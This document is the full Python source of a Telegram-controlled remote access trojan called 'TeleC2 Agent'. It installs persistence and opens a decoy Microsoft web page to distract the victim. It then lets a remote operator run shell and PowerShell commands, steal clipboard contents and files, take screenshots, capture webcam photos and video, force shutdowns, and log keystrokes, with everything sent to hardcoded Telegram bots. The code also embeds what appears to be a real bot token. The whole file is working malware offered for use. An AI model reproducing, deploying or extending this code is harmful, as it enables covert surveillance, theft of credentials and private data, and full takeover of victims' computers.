#!/usr/bin/env python3
# TeleC2 Agent – Hardcoded token, persistent, debug log to Telegram, decoy URL
import cv2
import time
import telebot
import platform
import pyautogui
import subprocess
import threading
from pynput import keyboard
import os
import re
import json
import socket
import psutil
from datetime import datetime
from uuid import getnode as get_mac
import sys
import base64
import io
import traceback
import persistence

# -----------------------------------------------------------------------------
# Hardcoded Configuration
# -----------------------------------------------------------------------------
BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"
TELEGRAM_USER_ID = 5178265082

# Keylogger bot (leave empty if not used)
KEYLOGGER_BOT_API_KEY = ""
KEYLOGGER_CHAT_ID = ""

# Decoy URL – displayed after successful startup
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Global log buffer
# -----------------------------------------------------------------------------
log_lines = []

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    log_lines.append(line)
    print(line)  # also goes to stdout if console were attached

def send_log_to_telegram(bot_instance):
    if not log_lines:
        return
    try:
        log_text = "\n".join(log_lines)
        bio = io.BytesIO(log_text.encode('utf-8'))
        bio.name = "Execution_log.txt"
        bio.seek(0)
        bot_instance.send_document(TELEGRAM_USER_ID, bio)
        log("Execution log sent to Telegram")
    except Exception as e:
        # can't log to Telegram if sending fails, just print
        print(f"Failed to send log: {e}")

# -----------------------------------------------------------------------------
# Persistence (already called at start)
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Telegram bots
# -----------------------------------------------------------------------------
bot = telebot.TeleBot(BOT_API_KEY)
keylogger_bot = telebot.TeleBot(KEYLOGGER_BOT_API_KEY) if KEYLOGGER_BOT_API_KEY else None

# Agent management (unchanged structure, but with debug logs)
agents_file = "agents.json"
active_agents = {}
agent_counter = 1

# Keylogger variables
keylogger_active = False
keylogger_listener = None
keystroke_buffer = ""
MAX_BUFFER_LENGTH = 100
last_send_time = time.time()
SEND_INTERVAL = 60

def load_agents():
    global active_agents, agent_counter
    try:
        if os.path.exists(agents_file):
            with open(agents_file, 'r') as f:
                data = json.load(f)
                active_agents = data.get('agents', {})
                agent_counter = data.get('counter', 1)
            log("Loaded agents from file")
    except Exception as e:
        log(f"Error loading agents: {e}")
        active_agents = {}
        agent_counter = 1

def save_agents():
    try:
        with open(agents_file, 'w') as f:
            json.dump({'agents': active_agents, 'counter': agent_counter}, f)
    except Exception as e:
        log(f"Error saving agents: {e}")

def get_system_id():
    hostname = execute_system_command("hostname").strip()
    username = execute_system_command("whoami").strip()
    return f"{hostname}/{username}"

def get_device_id():
    mac = ':'.join(('%012X' % get_mac())[i:i+2] for i in range(0, 12, 2))
    return mac

def verify_telegram_id(uid):
    return TELEGRAM_USER_ID == uid

def execute_system_command(cmd):
    max_message_length = 2048
    try:
        output = subprocess.getstatusoutput(cmd)
        if len(output[1]) > max_message_length:
            return str(output[1][:max_message_length])
        return str(output[1])
    except Exception as e:
        log(f"System command failed: {cmd} -> {e}")
        return "Command execution failed"

def execute_powershell(cmd):
    max_message_length = 2048
    try:
        if platform.system() == "Windows":
            output = subprocess.getstatusoutput(f"powershell -Command {cmd}")
        else:
            output = subprocess.getstatusoutput(f"pwsh -Command {cmd}")
        if len(output[1]) > max_message_length:
            return str(output[1][:max_message_length])
        return str(output[1])
    except Exception as e:
        log(f"PowerShell command failed: {cmd} -> {e}")
        return "PowerShell execution failed"

def get_clipboard():
    try:
        if platform.system() == "Windows":
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data
        else:
            return execute_system_command("xclip -selection clipboard -o")
    except Exception as e:
        log(f"Clipboard error: {e}")
        return "Could not access clipboard"

# -----------------------------------------------------------------------------
# Keylogger functions (exact original, only active if bot token provided)
# -----------------------------------------------------------------------------
def on_press(key):
    global keystroke_buffer, last_send_time
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystroke_buffer += key.char
        elif key == keyboard.Key.space:
            keystroke_buffer += " "
        elif key == keyboard.Key.enter:
            keystroke_buffer += "\n"
        elif key == keyboard.Key.tab:
            keystroke_buffer += "\t"
        else:
            keystroke_buffer += f"[{str(key).replace('Key.', '')}]"
    except AttributeError:
        keystroke_buffer += f"[{str(key)}]"
    current_time = time.time()
    if (len(keystroke_buffer) >= MAX_BUFFER_LENGTH or 
        (current_time - last_send_time >= SEND_INTERVAL and keystroke_buffer)):
        send_keystrokes()

def send_keystrokes():
    global keystroke_buffer, last_send_time
    if keystroke_buffer and keylogger_bot:
        try:
            system_id = get_system_id()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"Keylogger data from: {system_id}\nTime: {timestamp}\n\n{keystroke_buffer}"
            keylogger_bot.send_message(KEYLOGGER_CHAT_ID, message)
            keystroke_buffer = ""
            last_send_time = time.time()
        except Exception as e:
            log(f"Keylogger send error: {e}")

def start_keylogger():
    global keylogger_active, keylogger_listener
    if keylogger_active:
        return "Keylogger is already running"
    if not keylogger_bot:
        return "Keylogger bot not configured"
    try:
        keylogger_listener = keyboard.Listener(on_press=on_press)
        keylogger_listener.start()
        keylogger_active = True
        def periodic_send():
            while keylogger_active:
                time.sleep(SEND_INTERVAL)
                send_keystrokes()
        threading.Thread(target=periodic_send, daemon=True).start()
        log("Keylogger started")
        return "Keylogger started successfully"
    except Exception as e:
        log(f"Keylogger start error: {e}")
        return f"Failed to start keylogger: {str(e)}"

def stop_keylogger():
    global keylogger_active, keylogger_listener, keystroke_buffer
    if not keylogger_active:
        return "Keylogger is not running"
    try:
        keylogger_active = False
        if keylogger_listener:
            keylogger_listener.stop()
        if keystroke_buffer:
            send_keystrokes()
        log("Keylogger stopped")
        return "Keylogger stopped successfully"
    except Exception as e:
        log(f"Keylogger stop error: {e}")
        return f"Failed to stop keylogger: {str(e)}"

# Keylog cleaning (full original implementations)
def apply_backspaces(s):
    pattern = re.compile(r'\[backspace\]', flags=re.IGNORECASE)
    parts = pattern.split(s)
    out = parts[0]
    for seg in parts[1:]:
        if out:
            out = out[:-1]
        out += seg
    return out

def process_special_keys(text):
    text = re.sub(r'\[shift\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[ctrl\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[alt\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[win\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[caps_lock\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[enter\]', '\n', text, flags=re.IGNORECASE)
    text = re.sub(r'\[tab\]', '\t', text, flags=re.IGNORECASE)
    text = re.sub(r'\[space\]', ' ', text, flags=re.IGNORECASE)
    text = re.sub(r'\[left\]', '[←]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[right\]', '[→]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[up\]', '[↑]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[down\]', '[↓]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[esc\]', '[Esc]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[delete\]', '[Del]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[backspace\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[insert\]', '[Ins]', text, flags=re.IGNORECASE)
    return text

def clean_keylogger_data(text):
    text = apply_backspaces(text)
    text = process_special_keys(text)
    return text

def clean_keylog_file(input_file, output_file):
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            raw_text = f.read()
        cleaned_text = clean_keylogger_data(raw_text)
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(cleaned_text)
        log(f"Cleaned keylog file {input_file} -> {output_file}")
        return f"Successfully cleaned keylog file. Output written to {output_file}"
    except Exception as e:
        log(f"Keylog file cleaning error: {e}")
        return f"Error cleaning file: {str(e)}"

# -----------------------------------------------------------------------------
# Agent registration
# -----------------------------------------------------------------------------
def register_agent():
    global agent_counter
    device_id = get_device_id()
    system_id = get_system_id()
    ip = socket.gethostbyname(socket.gethostname())
    for aid, agent in active_agents.items():
        if agent['device_id'] == device_id:
            agent['last_seen'] = datetime.now().isoformat()
            agent['status'] = 'online'
            save_agents()
            log(f"Agent already registered, ID: {aid}")
            return aid
    aid = str(agent_counter)
    active_agents[aid] = {
        'device_id': device_id,
        'system_id': system_id,
        'ip': ip,
        'last_seen': datetime.now().isoformat(),
        'status': 'online'
    }
    agent_counter += 1
    save_agents()
    log(f"New agent registered, ID: {aid}")
    return aid

def is_valid_agent_id(agent_id):
    return agent_id in active_agents

def is_target_agent(agent_id):
    return agent_id == get_device_id()

# File handling
def view_file_content(file_path):
    try:
        if not os.path.exists(file_path):
            return f"File not found: {file_path}"
        if os.path.isdir(file_path):
            return f"Path is a directory, not a file: {file_path}"
        file_size = os.path.getsize(file_path)
        if file_size > 10 * 1024 * 1024:
            return f"File too large to view ({file_size/1024/1024:.2f} MB). Use /downloadFile instead."
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        max_length = 4000
        if len(content) > max_length:
            content = content[:max_length] + "\n\n... (truncated due to length)"
        return f"Contents of {file_path}:\n\n{content}"
    except Exception as e:
        log(f"viewFile error: {e}")
        return f"Error reading file: {str(e)}"

def download_file(file_path):
    try:
        if not os.path.exists(file_path):
            return None, f"File not found: {file_path}"
        if os.path.isdir(file_path):
            return None, f"Path is a directory, not a file: {file_path}"
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:
            return None, f"File too large to download ({file_size/1024/1024:.2f} MB). Max size is 50MB."
        return file_path, None
    except Exception as e:
        log(f"downloadFile access error: {e}")
        return None, f"Error accessing file: {str(e)}"

# -----------------------------------------------------------------------------
# Telegram Command Handlers (all original except prank removed)
# -----------------------------------------------------------------------------
@bot.message_handler(commands=['start'])
def start_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    aid = register_agent()
    system_id = get_system_id()
    response = (f"Agent registered with ID: {aid}\n"
                f"System: {system_id}\n\n"
                "Available agents:\nID  |  System\n-------------------\n")
    for a_id, agent in active_agents.items():
        if agent['status'] == 'online':
            response += f"{a_id}  {agent['system_id']}\n"
    response += f"\nTotal active agents: {len([a for a in active_agents.values() if a['status'] == 'online'])}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['scan'])
def scan_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    response = "Available agents:\nID  |  System\n-------------------\n"
    for aid, agent in active_agents.items():
        if agent['status'] == 'online':
            response += f"{aid}  {agent['system_id']}\n"
    response += f"\nTotal active agents: {len([a for a in active_agents.values() if a['status'] == 'online'])}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['die'])
def die_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ')
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /die <agent_id>")
        return
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        log("Die command received, exiting")
        bot.reply_to(message, "Shutting down this agent...")
        os._exit(0)
    else:
        bot.reply_to(message, "Agent shutdown command sent (would work in multi-agent setup)")

@bot.message_handler(commands=['off'])
def off_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /off <agent_id>")
        return
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        try:
            subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=True)
        except Exception as e:
            bot.reply_to(message, f"Failed to shutdown: {e}")
            return
        active_agents[agent_id]['status'] = 'offline'
        active_agents[agent_id]['last_seen'] = datetime.now().isoformat()
        save_agents()
        bot.reply_to(message, "Agent PC is shutting down (forced).")
    else:
        bot.reply_to(message, "Shutdown command sent to agent (multi-agent setup)")

@bot.message_handler(commands=['cmd'])
def cmd_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /cmd <agent_id> <command>")
        return
    agent_id = parts[1]
    command = parts[2]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        log(f"Executing cmd: {command}")
        result = execute_system_command(command)
        bot.reply_to(message, f"Command result:\n{result}")
    else:
        bot.reply_to(message, "Remote command execution (would work in multi-agent setup)")

@bot.message_handler(commands=['pow'])
def pow_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /pow <agent_id> <powershell_command>")
        return
    agent_id = parts[1]
    command = parts[2]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        log(f"Executing pow: {command}")
        result = execute_powershell(command)
        bot.reply_to(message, f"PowerShell result:\n{result}")
    else:
        bot.reply_to(message, "Remote PowerShell execution (would work in multi-agent setup)")

@bot.message_handler(commands=['info'])
def info_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ')
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /info <agent_id>")
        return
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        system_info = f"""
System: {platform.system()} {platform.release()}
Hostname: {socket.gethostname()}
IP: {socket.gethostbyname(socket.gethostname())}
Username: {execute_system_command("whoami")}
CPU: {platform.processor()}
Memory: {psutil.virtual_memory().total / (1024**3):.2f} GB
        """
        bot.reply_to(message, system_info)
    else:
        bot.reply_to(message, "Remote info request (would work in multi-agent setup)")

@bot.message_handler(commands=['clip'])
def clip_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ')
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /clip <agent_id>")
        return
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        clipboard = get_clipboard()
        bot.reply_to(message, f"Clipboard contents:\n{clipboard}")
    else:
        bot.reply_to(message, "Remote clipboard access (would work in multi-agent setup)")

@bot.message_handler(commands=['viewFile'])
def view_file_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /viewFile <agent_id> <file_path>")
        return
    agent_id = parts[1]
    file_path = parts[2]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        content = view_file_content(file_path)
        bot.reply_to(message, content)
    else:
        bot.reply_to(message, "Remote file view (would work in multi-agent setup)")

@bot.message_handler(commands=['downloadFile'])
def download_file_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /downloadFile <agent_id> <file_path>")
        return
    agent_id = parts[1]
    file_path = parts[2]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        path, error = download_file(file_path)
        if error:
            bot.reply_to(message, error)
        else:
            try:
                with open(path, 'rb') as f:
                    bot.send_document(message.chat.id, f)
                bot.reply_to(message, "File downloaded successfully")
            except Exception as e:
                log(f"File download send error: {e}")
                bot.reply_to(message, f"Error sending file: {str(e)}")
    else:
        bot.reply_to(message, "Remote file download (would work in multi-agent setup)")

@bot.message_handler(commands=['screenshot'])
def screenshot_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ')
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /screenshot <agent_id>")
        return
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        try:
            screenshot = pyautogui.screenshot()
            timestamp = int(time.time())
            filename = f"{timestamp}.png"
            screenshot.save(filename)
            with open(filename, "rb") as image:
                bot.send_photo(message.from_user.id, image)
            os.remove(filename)
            log("Screenshot sent")
            bot.reply_to(message, "[+] Screenshot taken")
        except Exception as e:
            log(f"Screenshot error: {e}")
            bot.reply_to(message, f"[!] Unsuccessful: {str(e)}")
    else:
        bot.reply_to(message, "Remote screenshot (would work in multi-agent setup)")

@bot.message_handler(commands=['webcam'])
def webcam_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ')
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /webcam <agent_id>")
        return
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                timestamp = int(time.time())
                filename = f"{timestamp}.png"
                cv2.imwrite(filename, frame)
                with open(filename, "rb") as image:
                    bot.send_photo(message.from_user.id, image)
                os.remove(filename)
                log("Webcam photo sent")
            cap.release()
        except Exception as e:
            log(f"Webcam error: {e}")
            bot.reply_to(message, f"[!] Unsuccessful: {str(e)}")
    else:
        bot.reply_to(message, "Remote webcam (would work in multi-agent setup)")

@bot.message_handler(commands=['video'])
def video_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ')
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /video <agent_id> <duration_seconds>")
        return
    agent_id = parts[1]
    duration = int(parts[2])
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    if is_target_agent(active_agents[agent_id]['device_id']):
        try:
            cap = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            timestamp = int(time.time())
            filename = f"{timestamp}.avi"
            out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
            start_time = time.time()
            while (time.time() - start_time) < duration:
                ret, frame = cap.read()
                if not ret:
                    break
                out.write(frame)
            out.release()
            cap.release()
            with open(filename, "rb") as video:
                bot.send_video(message.from_user.id, video)
            os.remove(filename)
            log(f"Video recorded ({duration}s) and sent")
        except Exception as e:
            log(f"Video error: {e}")
            bot.reply_to(message, f"[!] Unsuccessful: {str(e)}")
    else:
        bot.reply_to(message, "Remote video (would work in multi-agent setup)")

@bot.message_handler(commands=['keylogger'])
def keylogger_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ')
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /keylogger <start|stop|status|clean> [agent_id]")
        return
    command = parts[1].lower()
    if command == "clean":
        if len(parts) != 5:
            bot.reply_to(message, "Usage: /keylogger clean <agent_id> <input_file> <output_file>")
            return
        agent_id = parts[2]
        if not is_valid_agent_id(agent_id):
            bot.reply_to(message, "Invalid agent ID")
            return
        if is_target_agent(active_agents[agent_id]['device_id']):
            input_file = parts[3]
            output_file = parts[4]
            result = clean_keylog_file(input_file, output_file)
            bot.reply_to(message, result)
        else:
            bot.reply_to(message, "Remote keylog cleaning (would work in multi-agent setup)")
    elif command in ["start", "stop", "status"]:
        if len(parts) != 3:
            bot.reply_to(message, f"Usage: /keylogger {command} <agent_id>")
            return
        agent_id = parts[2]
        if not is_valid_agent_id(agent_id):
            bot.reply_to(message, "Invalid agent ID")
            return
        if is_target_agent(active_agents[agent_id]['device_id']):
            if command == "start":
                result = start_keylogger()
            elif command == "stop":
                result = stop_keylogger()
            else:
                result = f"Keylogger is {'active' if keylogger_active else 'inactive'}"
            bot.reply_to(message, result)
        else:
            bot.reply_to(message, f"Remote keylogger {command} (would work in multi-agent setup)")
    else:
        bot.reply_to(message, "Unknown command. Use: start, stop, status, or clean")

def cleanup():
    if keylogger_active and keystroke_buffer:
        send_keystrokes()

# -----------------------------------------------------------------------------
# Main Execution (debug log, persistence, log to Telegram, decoy URL)
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    log("=== Agent starting ===")
    try:
        # 1. Persistence
        try:
            persistence.install_persistence()
            log("Persistence installed")
        except Exception as e:
            log(f"Persistence error: {traceback.format_exc()}")

        # 2. Load previous agents
        load_agents()

        # 3. Register this agent
        agent_id = register_agent()
        log(f"Agent ID: {agent_id}")

        # 4. Send execution log to Telegram
        log("Sending execution log to Telegram")
        send_log_to_telegram(bot)

        # 5. Open decoy URL (last visual action)
        log(f"Opening decoy URL: {DECOY_URL}")
        os.system(f'start "" {DECOY_URL}')   # Windows only; works from hidden process

        # 6. Start Telegram polling (this blocks until /die)
        log("Entering main polling loop")
        bot.infinity_polling()

    except Exception as e:
        log(f"Fatal error: {traceback.format_exc()}")
        # Try to send log even after fatal error
        try:
            send_log_to_telegram(bot)
        except:
            pass
    finally:
        cleanup()
